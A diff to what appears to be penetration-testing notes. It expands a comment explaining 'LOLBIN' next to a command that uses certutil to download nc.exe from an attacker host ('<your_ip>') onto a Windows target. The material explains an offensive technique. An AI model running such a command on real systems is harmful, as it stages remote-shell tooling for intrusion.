@@ -98,7 +98,8 @@ Two patterns worth having as reflexes when there's no file-upload form to abuse 
 
 ```cmd
 :: certutil, a Microsoft-signed binary that ships on every Windows install by default,
-:: repurposed as a downloader (LOLBIN). No upload tool needed on the target beforehand,
+:: repurposed as a downloader (LOLBIN = Living Off the Land Binary, using a legit OS tool
+:: for something it wasn't designed for). No upload tool needed on the target beforehand,
 :: the "downloader" is already sitting there.
 cmd.exe /c certutil -urlcache -split -f "http://<your_ip>/nc.exe" C:\ProgramData\nc.exe
 ```
